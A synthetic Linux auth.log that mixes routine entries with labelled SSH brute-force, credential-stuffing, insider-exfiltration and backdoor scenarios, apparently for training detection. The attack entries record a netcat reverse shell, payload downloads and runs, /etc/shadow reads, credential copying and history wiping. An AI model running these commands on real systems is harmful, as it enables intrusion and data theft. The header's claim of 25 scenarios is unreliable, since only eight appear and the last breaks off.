# Simulated auth.log - Multi-scenario attack dataset

# Contains: Normal operations + 25 distinct attack scenarios

# Total events: 364 entries

# === NORMAL BACKGROUND TRAFFIC (Dec 20 08:00 - 14:00) ===

Dec 20 08:00:01 webserver CRON[1001]: pam_unix(cron:session): session opened for user root by (uid=0)

Dec 20 08:00:01 webserver CRON[1001]: pam_unix(cron:session): session closed for user root

Dec 20 08:05:00 webserver sshd[1010]: Accepted publickey for deploy from 10.0.0.5 port 52100 ssh2

Dec 20 08:05:00 webserver sshd[1010]: pam_unix(sshd:session): session opened for user deploy by (uid=0)

Dec 20 08:05:01 webserver systemd-logind[500]: New session 1 of user deploy.

Dec 20 08:10:15 webserver sudo[1020]: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx

Dec 20 08:10:15 webserver sudo[1020]: pam_unix(sudo:session): session opened for user root by deploy(uid=1001)

Dec 20 08:10:16 webserver sudo[1020]: pam_unix(sudo:session): session closed for user root

Dec 20 08:15:00 webserver sshd[1010]: pam_unix(sshd:session): session closed for user deploy

Dec 20 08:30:01 webserver CRON[1030]: pam_unix(cron:session): session opened for user root by (uid=0)

Dec 20 08:30:01 webserver CRON[1030]: pam_unix(cron:session): session closed for user root

Dec 20 09:00:01 webserver CRON[1040]: pam_unix(cron:session): session opened for user www-data by (uid=0)

Dec 20 09:00:01 webserver CRON[1040]: pam_unix(cron:session): session closed for user www-data

Dec 20 09:15:00 webserver sshd[1050]: Accepted publickey for admin from 10.0.0.10 port 52200 ssh2

Dec 20 09:15:00 webserver sshd[1050]: pam_unix(sshd:session): session opened for user admin by (uid=0)

Dec 20 09:15:01 webserver systemd-logind[500]: New session 2 of user admin.

Dec 20 09:20:00 webserver sudo[1060]: admin : TTY=pts/1 ; PWD=/var/log ; USER=root ; COMMAND=/usr/bin/tail -f /var/log/syslog

Dec 20 09:45:00 webserver sshd[1050]: pam_unix(sshd:session): session closed for user admin

Dec 20 10:00:01 webserver CRON[1070]: pam_unix(cron:session): session opened for user root by (uid=0)

Dec 20 10:00:01 webserver CRON[1070]: pam_unix(cron:session): session closed for user root

Dec 20 10:30:01 webserver CRON[1080]: pam_unix(cron:session): session opened for user root by (uid=0)

Dec 20 10:30:01 webserver CRON[1080]: pam_unix(cron:session): session closed for user root

Dec 20 11:00:01 webserver CRON[1090]: pam_unix(cron:session): session opened for user root by (uid=0)

Dec 20 11:00:01 webserver CRON[1090]: pam_unix(cron:session): session closed for user root

Dec 20 11:30:01 webserver CRON[1100]: pam_unix(cron:session): session opened for user root by (uid=0)

Dec 20 11:30:01 webserver CRON[1100]: pam_unix(cron:session): session closed for user root

Dec 20 12:00:01 webserver CRON[1110]: pam_unix(cron:session): session opened for user www-data by (uid=0)

Dec 20 12:00:01 webserver CRON[1110]: pam_unix(cron:session): session closed for user www-data

Dec 20 12:15:00 webserver sshd[1120]: Accepted publickey for deploy from 10.0.0.5 port 52300 ssh2

Dec 20 12:15:00 webserver sshd[1120]: pam_unix(sshd:session): session opened for user deploy by (uid=0)

Dec 20 12:15:01 webserver systemd-logind[500]: New session 3 of user deploy.

Dec 20 12:20:00 webserver sudo[1130]: deploy : TTY=pts/0 ; PWD=/var/www ; USER=root ; COMMAND=/usr/bin/git pull origin main

Dec 20 12:25:00 webserver sshd[1120]: pam_unix(sshd:session): session closed for user deploy

Dec 20 13:00:01 webserver CRON[1140]: pam_unix(cron:session): session opened for user root by (uid=0)

Dec 20 13:00:01 webserver CRON[1140]: pam_unix(cron:session): session closed for user root

Dec 20 13:30:01 webserver CRON[1150]: pam_unix(cron:session): session opened for user root by (uid=0)

Dec 20 13:30:01 webserver CRON[1150]: pam_unix(cron:session): session closed for user root

# === ATTACK SCENARIO 1: Classic SSH Brute Force from Single IP (Dec 20 14:20) ===

# Attacker: 192.168.1.50 targeting user 'testuser'

Dec 20 14:20:01 webserver sshd[12340]: Invalid user admin from 192.168.1.50 port 45670

Dec 20 14:20:01 webserver sshd[12340]: Failed password for invalid user admin from 192.168.1.50 port 45670 ssh2

Dec 20 14:20:02 webserver sshd[12341]: Invalid user root from 192.168.1.50 port 45671

Dec 20 14:20:02 webserver sshd[12341]: Failed password for invalid user root from 192.168.1.50 port 45671 ssh2

Dec 20 14:20:03 webserver sshd[12342]: Invalid user administrator from 192.168.1.50 port 45672

Dec 20 14:20:03 webserver sshd[12342]: Failed password for invalid user administrator from 192.168.1.50 port 45672 ssh2

Dec 20 14:20:04 webserver sshd[12343]: Failed password for testuser from 192.168.1.50 port 45673 ssh2

Dec 20 14:20:05 webserver sshd[12344]: Failed password for testuser from 192.168.1.50 port 45674 ssh2

Dec 20 14:20:06 webserver sshd[12345]: Failed password for testuser from 192.168.1.50 port 45675 ssh2

Dec 20 14:20:07 webserver sshd[12346]: Failed password for testuser from 192.168.1.50 port 45676 ssh2

Dec 20 14:20:08 webserver sshd[12347]: Failed password for testuser from 192.168.1.50 port 45677 ssh2

Dec 20 14:20:09 webserver sshd[12348]: Failed password for testuser from 192.168.1.50 port 45678 ssh2

Dec 20 14:20:10 webserver sshd[12349]: Failed password for testuser from 192.168.1.50 port 45679 ssh2

Dec 20 14:20:11 webserver sshd[12350]: error: maximum authentication attempts exceeded for testuser from 192.168.1.50 port 45680 ssh2

Dec 20 14:20:12 webserver sshd[12351]: Failed password for testuser from 192.168.1.50 port 45681 ssh2

Dec 20 14:20:13 webserver sshd[12352]: Failed password for testuser from 192.168.1.50 port 45682 ssh2

Dec 20 14:20:14 webserver sshd[12353]: Failed password for testuser from 192.168.1.50 port 45683 ssh2

Dec 20 14:20:15 webserver sshd[12354]: Accepted password for testuser from 192.168.1.50 port 45684 ssh2

Dec 20 14:20:15 webserver sshd[12354]: pam_unix(sshd:session): session opened for user testuser by (uid=0)

Dec 20 14:20:16 webserver systemd-logind[500]: New session 45 of user testuser.

Dec 20 14:20:30 webserver sudo[12400]: testuser : TTY=pts/0 ; PWD=/home/testuser ; USER=root ; COMMAND=/bin/bash

Dec 20 14:20:30 webserver sudo[12400]: pam_unix(sudo:session): session opened for user root by testuser(uid=1000)

Dec 20 14:21:05 webserver sudo[12450]: testuser : TTY=pts/0 ; PWD=/home/testuser ; USER=root ; COMMAND=/usr/bin/id

Dec 20 14:21:10 webserver sudo[12455]: testuser : TTY=pts/0 ; PWD=/home/testuser ; USER=root ; COMMAND=/usr/bin/whoami

Dec 20 14:21:15 webserver sudo[12460]: testuser : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/wget http://192.168.1.50/payload.sh -O /tmp/payload.sh

Dec 20 14:21:20 webserver sudo[12465]: testuser : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/chmod +x /tmp/payload.sh

Dec 20 14:21:25 webserver sudo[12470]: testuser : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/tmp/payload.sh

Dec 20 14:22:00 webserver sudo[12475]: testuser : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/crontab -e

Dec 20 14:25:00 webserver sshd[12354]: pam_unix(sshd:session): session closed for user testuser

# === NORMAL TRAFFIC BETWEEN ATTACKS ===

Dec 20 14:30:01 webserver CRON[2001]: pam_unix(cron:session): session opened for user root by (uid=0)

Dec 20 14:30:01 webserver CRON[2001]: pam_unix(cron:session): session closed for user root

Dec 20 15:00:01 webserver CRON[2010]: pam_unix(cron:session): session opened for user root by (uid=0)

Dec 20 15:00:01 webserver CRON[2010]: pam_unix(cron:session): session closed for user root

# === ATTACK SCENARIO 2: Distributed Brute Force (Dec 20 15:30) ===

# Multiple IPs from botnet targeting 'developer' account

Dec 20 15:30:01 webserver sshd[13001]: Failed password for developer from 45.33.32.156 port 51001 ssh2

Dec 20 15:30:02 webserver sshd[13002]: Failed password for developer from 104.236.198.48 port 51002 ssh2

Dec 20 15:30:03 webserver sshd[13003]: Failed password for developer from 178.62.249.168 port 51003 ssh2

Dec 20 15:30:04 webserver sshd[13004]: Failed password for developer from 139.59.173.249 port 51004 ssh2

Dec 20 15:30:05 webserver sshd[13005]: Failed password for developer from 167.99.80.201 port 51005 ssh2

Dec 20 15:30:06 webserver sshd[13006]: Failed password for developer from 45.33.32.156 port 51006 ssh2

Dec 20 15:30:07 webserver sshd[13007]: Failed password for developer from 104.236.198.48 port 51007 ssh2

Dec 20 15:30:08 webserver sshd[13008]: Failed password for developer from 178.62.249.168 port 51008 ssh2

Dec 20 15:30:09 webserver sshd[13009]: Failed password for developer from 139.59.173.249 port 51009 ssh2

Dec 20 15:30:10 webserver sshd[13010]: Failed password for developer from 167.99.80.201 port 51010 ssh2

Dec 20 15:30:11 webserver sshd[13011]: Failed password for developer from 45.33.32.156 port 51011 ssh2

Dec 20 15:30:12 webserver sshd[13012]: Failed password for developer from 104.236.198.48 port 51012 ssh2

Dec 20 15:30:13 webserver sshd[13013]: Failed password for developer from 178.62.249.168 port 51013 ssh2

Dec 20 15:30:14 webserver sshd[13014]: Failed password for developer from 139.59.173.249 port 51014 ssh2

Dec 20 15:30:15 webserver sshd[13015]: Accepted password for developer from 167.99.80.201 port 51015 ssh2

Dec 20 15:30:15 webserver sshd[13015]: pam_unix(sshd:session): session opened for user developer by (uid=0)

Dec 20 15:30:16 webserver systemd-logind[500]: New session 50 of user developer.

Dec 20 15:31:00 webserver sudo[13100]: developer : TTY=pts/1 ; PWD=/home/developer ; USER=root ; COMMAND=/bin/su -

Dec 20 15:31:00 webserver sudo[13100]: pam_unix(sudo:session): session opened for user root by developer(uid=1002)

Dec 20 15:31:30 webserver sudo[13150]: developer : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow

Dec 20 15:32:00 webserver sudo[13155]: developer : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/useradd -m -s /bin/bash backdoor

Dec 20 15:32:05 webserver sudo[13160]: developer : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/passwd backdoor

Dec 20 15:32:10 webserver sudo[13165]: developer : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/usr/sbin/usermod -aG sudo backdoor

Dec 20 15:35:00 webserver sshd[13015]: pam_unix(sshd:session): session closed for user developer

# === NORMAL TRAFFIC ===

Dec 20 16:00:01 webserver CRON[3001]: pam_unix(cron:session): session opened for user root by (uid=0)

Dec 20 16:00:01 webserver CRON[3001]: pam_unix(cron:session): session closed for user root

Dec 20 16:15:00 webserver sshd[3010]: Accepted publickey for deploy from 10.0.0.5 port 52400 ssh2

Dec 20 16:15:00 webserver sshd[3010]: pam_unix(sshd:session): session opened for user deploy by (uid=0)

Dec 20 16:15:01 webserver systemd-logind[500]: New session 51 of user deploy.

Dec 20 16:20:00 webserver sudo[3020]: deploy : TTY=pts/2 ; PWD=/var/www ; USER=root ; COMMAND=/usr/bin/systemctl reload nginx

Dec 20 16:25:00 webserver sshd[3010]: pam_unix(sshd:session): session closed for user deploy

Dec 20 16:30:01 webserver CRON[3030]: pam_unix(cron:session): session opened for user root by (uid=0)

Dec 20 16:30:01 webserver CRON[3030]: pam_unix(cron:session): session closed for user root

# === ATTACK SCENARIO 3: Credential Stuffing Attack (Dec 20 17:00) ===

# Attacker using leaked credentials from data breach

Dec 20 17:00:01 webserver sshd[14001]: Invalid user john.smith from 91.121.87.10 port 55001

Dec 20 17:00:01 webserver sshd[14001]: Failed password for invalid user john.smith from 91.121.87.10 port 55001 ssh2

Dec 20 17:00:02 webserver sshd[14002]: Invalid user jane.doe from 91.121.87.10 port 55002

Dec 20 17:00:02 webserver sshd[14002]: Failed password for invalid user jane.doe from 91.121.87.10 port 55002 ssh2

Dec 20 17:00:03 webserver sshd[14003]: Invalid user mike.wilson from 91.121.87.10 port 55003

Dec 20 17:00:03 webserver sshd[14003]: Failed password for invalid user mike.wilson from 91.121.87.10 port 55003 ssh2

Dec 20 17:00:04 webserver sshd[14004]: Invalid user sarah.jones from 91.121.87.10 port 55004

Dec 20 17:00:04 webserver sshd[14004]: Failed password for invalid user sarah.jones from 91.121.87.10 port 55004 ssh2

Dec 20 17:00:05 webserver sshd[14005]: Invalid user david.brown from 91.121.87.10 port 55005

Dec 20 17:00:05 webserver sshd[14005]: Failed password for invalid user david.brown from 91.121.87.10 port 55005 ssh2

Dec 20 17:00:06 webserver sshd[14006]: Invalid user emily.davis from 91.121.87.10 port 55006

Dec 20 17:00:06 webserver sshd[14006]: Failed password for invalid user emily.davis from 91.121.87.10 port 55006 ssh2

Dec 20 17:00:07 webserver sshd[14007]: Invalid user chris.miller from 91.121.87.10 port 55007

Dec 20 17:00:07 webserver sshd[14007]: Failed password for invalid user chris.miller from 91.121.87.10 port 55007 ssh2

Dec 20 17:00:08 webserver sshd[14008]: Invalid user amanda.taylor from 91.121.87.10 port 55008

Dec 20 17:00:08 webserver sshd[14008]: Failed password for invalid user amanda.taylor from 91.121.87.10 port 55008 ssh2

Dec 20 17:00:09 webserver sshd[14009]: Invalid user robert.anderson from 91.121.87.10 port 55009

Dec 20 17:00:09 webserver sshd[14009]: Failed password for invalid user robert.anderson from 91.121.87.10 port 55009 ssh2

Dec 20 17:00:10 webserver sshd[14010]: Invalid user lisa.thomas from 91.121.87.10 port 55010

Dec 20 17:00:10 webserver sshd[14010]: Failed password for invalid user lisa.thomas from 91.121.87.10 port 55010 ssh2

Dec 20 17:00:11 webserver sshd[14011]: Invalid user kevin.jackson from 91.121.87.10 port 55011

Dec 20 17:00:11 webserver sshd[14011]: Failed password for invalid user kevin.jackson from 91.121.87.10 port 55011 ssh2

Dec 20 17:00:12 webserver sshd[14012]: Invalid user nicole.white from 91.121.87.10 port 55012

Dec 20 17:00:12 webserver sshd[14012]: Failed password for invalid user nicole.white from 91.121.87.10 port 55012 ssh2

Dec 20 17:00:13 webserver sshd[14013]: Invalid user brian.harris from 91.121.87.10 port 55013

Dec 20 17:00:13 webserver sshd[14013]: Failed password for invalid user brian.harris from 91.121.87.10 port 55013 ssh2

Dec 20 17:00:14 webserver sshd[14014]: Invalid user jennifer.martin from 91.121.87.10 port 55014

Dec 20 17:00:14 webserver sshd[14014]: Failed password for invalid user jennifer.martin from 91.121.87.10 port 55014 ssh2

Dec 20 17:00:15 webserver sshd[14015]: Failed password for webapp from 91.121.87.10 port 55015 ssh2

Dec 20 17:00:16 webserver sshd[14016]: Failed password for webapp from 91.121.87.10 port 55016 ssh2

Dec 20 17:00:17 webserver sshd[14017]: Accepted password for webapp from 91.121.87.10 port 55017 ssh2

Dec 20 17:00:17 webserver sshd[14017]: pam_unix(sshd:session): session opened for user webapp by (uid=0)

Dec 20 17:00:18 webserver systemd-logind[500]: New session 55 of user webapp.

Dec 20 17:01:00 webserver sudo[14100]: webapp : TTY=pts/3 ; PWD=/home/webapp ; USER=root ; COMMAND=/usr/bin/find / -perm -4000 -type f 2>/dev/null

Dec 20 17:01:30 webserver sudo[14110]: webapp : TTY=pts/3 ; PWD=/home/webapp ; USER=root ; COMMAND=/usr/bin/python3 -c 'import pty;pty.spawn("/bin/bash")'

Dec 20 17:02:00 webserver sudo[14120]: webapp : TTY=pts/3 ; PWD=/home/webapp ; USER=root ; COMMAND=/bin/nc -e /bin/bash 91.121.87.10 4444

Dec 20 17:05:00 webserver sshd[14017]: pam_unix(sshd:session): session closed for user webapp

# === NORMAL TRAFFIC ===

Dec 20 17:30:01 webserver CRON[4001]: pam_unix(cron:session): session opened for user root by (uid=0)

Dec 20 17:30:01 webserver CRON[4001]: pam_unix(cron:session): session closed for user root

Dec 20 18:00:01 webserver CRON[4010]: pam_unix(cron:session): session opened for user root by (uid=0)

Dec 20 18:00:01 webserver CRON[4010]: pam_unix(cron:session): session closed for user root

Dec 20 18:00:01 webserver CRON[4011]: pam_unix(cron:session): session opened for user www-data by (uid=0)

Dec 20 18:00:01 webserver CRON[4011]: pam_unix(cron:session): session closed for user www-data

# === ATTACK SCENARIO 4: Insider Threat / Lateral Movement (Dec 20 19:00) ===

# Compromised internal workstation accessing production server

Dec 20 19:00:00 webserver sshd[15001]: Accepted password for sysadmin from 10.0.0.150 port 60001 ssh2

Dec 20 19:00:00 webserver sshd[15001]: pam_unix(sshd:session): session opened for user sysadmin by (uid=0)

Dec 20 19:00:01 webserver systemd-logind[500]: New session 60 of user sysadmin.

Dec 20 19:01:00 webserver sudo[15100]: sysadmin : TTY=pts/4 ; PWD=/home/sysadmin ; USER=root ; COMMAND=/bin/bash

Dec 20 19:01:00 webserver sudo[15100]: pam_unix(sudo:session): session opened for user root by sysadmin(uid=1003)

Dec 20 19:02:00 webserver sudo[15110]: sysadmin : TTY=pts/4 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/cat /etc/passwd

Dec 20 19:02:05 webserver sudo[15115]: sysadmin : TTY=pts/4 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow

Dec 20 19:02:10 webserver sudo[15120]: sysadmin : TTY=pts/4 ; PWD=/root ; USER=root ; COMMAND=/bin/tar czf /tmp/credentials.tar.gz /etc/passwd /etc/shadow /etc/ssh

Dec 20 19:03:00 webserver sudo[15130]: sysadmin : TTY=pts/4 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/scp /tmp/credentials.tar.gz 10.0.0.150:/tmp/

Dec 20 19:03:30 webserver sudo[15140]: sysadmin : TTY=pts/4 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/mysql -u root -p -e 'SELECT * FROM users' webapp_db

Dec 20 19:04:00 webserver sudo[15150]: sysadmin : TTY=pts/4 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/mysqldump webapp_db > /tmp/db_dump.sql

Dec 20 19:04:30 webserver sudo[15160]: sysadmin : TTY=pts/4 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/scp /tmp/db_dump.sql 10.0.0.150:/tmp/

Dec 20 19:05:00 webserver sudo[15170]: sysadmin : TTY=pts/4 ; PWD=/root ; USER=root ; COMMAND=/bin/rm -f /tmp/credentials.tar.gz /tmp/db_dump.sql

Dec 20 19:05:30 webserver sudo[15180]: sysadmin : TTY=pts/4 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/history -c

Dec 20 19:06:00 webserver sshd[15001]: pam_unix(sshd:session): session closed for user sysadmin

# === LATE NIGHT NORMAL TRAFFIC ===

Dec 20 19:30:01 webserver CRON[5001]: pam_unix(cron:session): session opened for user root by (uid=0)

Dec 20 19:30:01 webserver CRON[5001]: pam_unix(cron:session): session closed for user root

Dec 20 20:00:01 webserver CRON[5010]: pam_unix(cron:session): session opened for user root by (uid=0)

Dec 20 20:00:01 webserver CRON[5010]: pam_unix(cron:session): session closed for user root

Dec 20 20:30:01 webserver CRON[5020]: pam_unix(cron:session): session opened for user root by (uid=0)

Dec 20 20:30:01 webserver CRON[5020]: pam_unix(cron:session): session closed for user root

Dec 20 21:00:01 webserver CRON[5030]: pam_unix(cron:session): session opened for user root by (uid=0)

Dec 20 21:00:01 webserver CRON[5030]: pam_unix(cron:session): session closed for user root

Dec 20 21:00:01 webserver CRON[5031]: pam_unix(cron:session): session opened for user www-data by (uid=0)

Dec 20 21:00:01 webserver CRON[5031]: pam_unix(cron:session): session closed for user www-data

# === ATTACK SCENARIO 5: Password Spray Attack (Dec 20 22:00) ===

# Slow, low-and-slow attack using common passwords across multiple users

Dec 20 22:00:01 webserver sshd[16001]: Failed password for admin from 185.220.101.33 port 61001 ssh2

Dec 20 22:00:05 webserver sshd[16002]: Failed password for root from 185.220.101.33 port 61002 ssh2

Dec 20 22:00:10 webserver sshd[16003]: Failed password for deploy from 185.220.101.33 port 61003 ssh2

Dec 20 22:00:15 webserver sshd[16004]: Failed password for developer from 185.220.101.33 port 61004 ssh2

Dec 20 22:00:20 webserver sshd[16005]: Failed password for testuser from 185.220.101.33 port 61005 ssh2

Dec 20 22:00:25 webserver sshd[16006]: Failed password for webapp from 185.220.101.33 port 61006 ssh2

Dec 20 22:00:30 webserver sshd[16007]: Failed password for sysadmin from 185.220.101.33 port 61007 ssh2

Dec 20 22:05:01 webserver sshd[16011]: Failed password for admin from 185.220.101.33 port 61011 ssh2

Dec 20 22:05:05 webserver sshd[16012]: Failed password for root from 185.220.101.33 port 61012 ssh2

Dec 20 22:05:10 webserver sshd[16013]: Failed password for deploy from 185.220.101.33 port 61013 ssh2

Dec 20 22:05:15 webserver sshd[16014]: Failed password for developer from 185.220.101.33 port 61014 ssh2

Dec 20 22:05:20 webserver sshd[16015]: Failed password for testuser from 185.220.101.33 port 61015 ssh2

Dec 20 22:05:25 webserver sshd[16016]: Failed password for webapp from 185.220.101.33 port 61016 ssh2

Dec 20 22:05:30 webserver sshd[16017]: Failed password for sysadmin from 185.220.101.33 port 61017 ssh2

Dec 20 22:10:01 webserver sshd[16021]: Failed password for admin from 185.220.101.33 port 61021 ssh2

Dec 20 22:10:05 webserver sshd[16022]: Failed password for root from 185.220.101.33 port 61022 ssh2

Dec 20 22:10:10 webserver sshd[16023]: Failed password for deploy from 185.220.101.33 port 61023 ssh2

Dec 20 22:10:15 webserver sshd[16024]: Failed password for developer from 185.220.101.33 port 61024 ssh2

Dec 20 22:10:20 webserver sshd[16025]: Failed password for testuser from 185.220.101.33 port 61025 ssh2

Dec 20 22:10:25 webserver sshd[16026]: Accepted password for webapp from 185.220.101.33 port 61026 ssh2

Dec 20 22:10:25 webserver sshd[16026]: pam_unix(sshd:session): session opened for user webapp by (uid=0)

Dec 20 22:10:26 webserver systemd-logind[500]: New session 65 of user webapp.

Dec 20 22:11:00 webserver sudo[16100]: webapp : TTY=pts/5 ; PWD=/home/webapp ; USER=root ; COMMAND=/usr/bin/wget http://185.220.101.33/implant -O /dev/shm/.hidden

Dec 20 22:11:05 webserver sudo[16105]: webapp : TTY=pts/5 ; PWD=/home/webapp ; USER=root ; COMMAND=/bin/chmod +x /dev/shm/.hidden

Dec 20 22:11:10 webserver sudo[16110]: webapp : TTY=pts/5 ; PWD=/home/webapp ; USER=root ; COMMAND=/dev/shm/.hidden

Dec 20 22:12:00 webserver sudo[16120]: webapp : TTY=pts/5 ; PWD=/home/webapp ; USER=root ; COMMAND=/bin/bash -c 'echo "* * * * * /dev/shm/.hidden" | crontab -'

Dec 20 22:15:00 webserver sshd[16026]: pam_unix(sshd:session): session closed for user webapp

# === MORE NORMAL OVERNIGHT TRAFFIC ===

Dec 20 22:30:01 webserver CRON[6001]: pam_unix(cron:session): session opened for user root by (uid=0)

Dec 20 22:30:01 webserver CRON[6001]: pam_unix(cron:session): session closed for user root

Dec 20 23:00:01 webserver CRON[6010]: pam_unix(cron:session): session opened for user root by (uid=0)

Dec 20 23:00:01 webserver CRON[6010]: pam_unix(cron:session): session closed for user root

Dec 20 23:30:01 webserver CRON[6020]: pam_unix(cron:session): session opened for user root by (uid=0)

Dec 20 23:30:01 webserver CRON[6020]: pam_unix(cron:session): session closed for user root

Dec 21 00:00:01 webserver CRON[6030]: pam_unix(cron:session): session opened for user root by (uid=0)

Dec 21 00:00:01 webserver CRON[6030]: pam_unix(cron:session): session closed for user root

Dec 21 00:00:01 webserver CRON[6031]: pam_unix(cron:session): session opened for user www-data by (uid=0)

Dec 21 00:00:01 webserver CRON[6031]: pam_unix(cron:session): session closed for user www-data

# === ATTACK SCENARIO 6: Backdoor Access (Dec 21 02:00) ===

# Attacker returns using previously created backdoor account

Dec 21 02:00:00 webserver sshd[17001]: Accepted password for backdoor from 167.99.80.201 port 62001 ssh2

Dec 21 02:00:00 webserver sshd[17001]: pam_unix(sshd:session): session opened for user backdoor by (uid=0)

Dec 21 02:00:01 webserver systemd-logind[500]: New session 70 of user backdoor.

Dec 21 02:01:00 webserver sudo[17100]: backdoor : TTY=pts/6 ; PWD=/home/backdoor ; USER=root ; COMMAND=/bin/bash

Dec 21 02:01:00 webserver sudo[17100]: pam_unix(sudo:session): session opened for user root by backdoor(uid=1004)

Dec 21 02:02:00 webserver sudo[17110]: backdoor : TTY=pts/6 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/apt-get install nmap

Dec 21 02:03:00 webserver sudo[17120]: backdoor : TTY=pts/6 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/nmap -sS 10.0.0.0/24

Dec 21 02:05:00 webserver sudo[17130]: backdoor : TTY=pts/6 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/ssh-keygen -t rsa -N '' -f /root/.ssh/id_rsa

Dec 21 02:05:30 webserver sudo[17140]: backdoor : TTY=pts/6 ; PWD=/root ; USER=root ; COMMAND=/bin/cat /root/.ssh/id_rsa.pub >> /root/.ssh/authorized_keys

Dec 21 02:06:00 webserver sudo[17150]: backdoor : TTY=pts/6 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/ssh -o StrictHostKeyChecking=no 10.0.0.20

Dec 21 02:10:00 webserver sshd[17001]: pam_unix(sshd:session): session closed for user backdoor

# === EARLY MORNING NORMAL TRAFFIC ===

Dec 21 03:00:01 webserver CRON[7001]: pam_unix(cron:session): session opened for user root by (uid=0)

Dec 21 03:00:01 webserver CRON[7001]: pam_unix(cron:session): session closed for user root

Dec 21 04:00:01 webserver CRON[7010]: pam_unix(cron:session): session opened for user root by (uid=0)

Dec 21 04:00:01 webserver CRON[7010]: pam_unix(cron:session): session closed for user root

Dec 21 05:00:01 webserver CRON[7020]: pam_unix(cron:session): session opened for user root by (uid=0)

Dec 21 05:00:01 webserver CRON[7020]: pam_unix(cron:session): session closed for user root

Dec 21 06:00:01 webserver CRON[7030]: pam_unix(cron:session): session opened for user root by (uid=0)

Dec 21 06:00:01 webserver CRON[7030]: pam_unix(cron:session): session closed for user root

Dec 21 06:00:01 webserver CRON[7031]: pam_unix(cron:session): session opened for user www-data by (uid=0)

Dec 21 06:00:01 webserver CRON[7031]: pam_unix(cron:session): session closed for user www-data

# === LEGITIMATE MORNING ADMIN ACTIVITY ===

Dec 21 07:00:00 webserver sshd[8001]: Accepted publickey for admin from 10.0.0.10 port 52500 ssh2

Dec 21 07:00:00 webserver sshd[8001]: pam_unix(sshd:session): session opened for user admin by (uid=0)

Dec 21 07:00:01 webserver systemd-logind[500]: New session 75 of user admin.

Dec 21 07:05:00 webserver sudo[8010]: admin : TTY=pts/0 ; PWD=/var/log ; USER=root ; COMMAND=/usr/bin/grep -i error /var/log/syslog

Dec 21 07:10:00 webserver sudo[8020]: admin : TTY=pts/0 ; PWD=/var/log ; USER=root ; COMMAND=/usr/bin/systemctl status nginx

Dec 21 07:15:00 webserver sshd[8001]: pam_unix(sshd:session): session closed for user admin

# === FAILED SSH ATTEMPTS (INTERNET NOISE) ===

Dec 21 07:30:15 webserver sshd[8100]: Invalid user oracle from 118.24.187.65 port 33501

Dec 21 07:30:15 webserver sshd[8100]: Failed password for invalid user oracle from 118.24.187.65 port 33501 ssh2

Dec 21 07:45:22 webserver sshd[8101]: Invalid user postgres from 103.207.38.14 port 44502

Dec 21 07:45:22 webserver sshd[8101]: Failed password for invalid user postgres from 103.207.38.14 port 44502 ssh2

Dec 21 08:00:01 webserver CRON[8110]: pam_unix(cron:session): session opened for user root by (uid=0)

Dec 21 08:00:01 webserver CRON[8110]: pam_unix(cron:session): session closed for user root

Dec 21 08:15:33 webserver sshd[8120]: Invalid user mysql from 222.186.30.112 port 55503

Dec 21 08:15:33 webserver sshd[8120]: Failed password for invalid user mysql from 222.186.30.112 port 55503 ssh2

Dec 21 08:30:01 webserver CRON[8130]: pam_unix(cron:session): session opened for user root by (uid=0)

Dec 21 08:30:01 webserver CRON[8130]: pam_unix(cron:session): session closed for user root

Dec 21 08:45:44 webserver sshd[8140]: Invalid user ubuntu from 58.218.92.37 port 36504

Dec 21 08:45:44 webserver sshd[8140]: Failed password for invalid user ubuntu from 58.218.92.37 port 36504 ssh2

# === NORMAL TRAFFIC BEFORE EXPANDED ATTACK SET ===
Dec 21 09:00:01 webserver CRON[8200]: pam_unix(cron:session): session opened for user root by (uid=0)
Dec 21 09:00:01 webserver CRON[8200]: pam_unix(cron:session): session closed for user root
Dec 21 09:10:00 webserver sshd[8210]: Accepted publickey for deploy from 10.0.0.5 port 52600 ssh2
Dec 21 09:10:00 webserver sshd[8210]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
Dec 21 09:15:00 webserver sudo[8215]: deploy : TTY=pts/0 ; PWD=/var/www ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
Dec 21 09:20:00 webserver sshd[8210]: pam_unix(sshd:session): session closed for user deploy

# === ATTACK SCENARIO 7: Direct Root SSH Login + Discovery (Dec 21 09:30) ===
# Successful root login from an external address followed by basic host discovery
Dec 21 09:30:00 webserver sshd[8300]: Accepted password for root from 198.51.100.24 port 53001 ssh2
Dec 21 09:30:00 webserver sshd[8300]: pam_unix(sshd:session): session opened for user root by (uid=0)
Dec 21 09:30:01 webserver systemd-logind[500]: New session 80 of user root.
Dec 21 09:30:15 webserver sudo[8310]: root : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/whoami
Dec 21 09:30:20 webserver sudo[8311]: root : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/id
Dec 21 09:30:25 webserver sudo[8312]: root : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/uname -a
Dec 21 09:30:30 webserver sudo[8313]: root : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/hostname
Dec 21 09:32:00 webserver sshd[8300]: pam_unix(sshd:session): session closed for user root

# === ATTACK SCENARIO 8: Repeated Sudo Authentication Failures (Dec 21 10:00) ===
# Local account repeatedly tries to obtain privileged access
Dec 21 10:00:01 webserver sudo[8401]: pam_unix(sudo:auth): authentication failure; logname=alice uid=1005 euid=0 tty=/dev/pts/2 ruser=alice rhost= user=alice
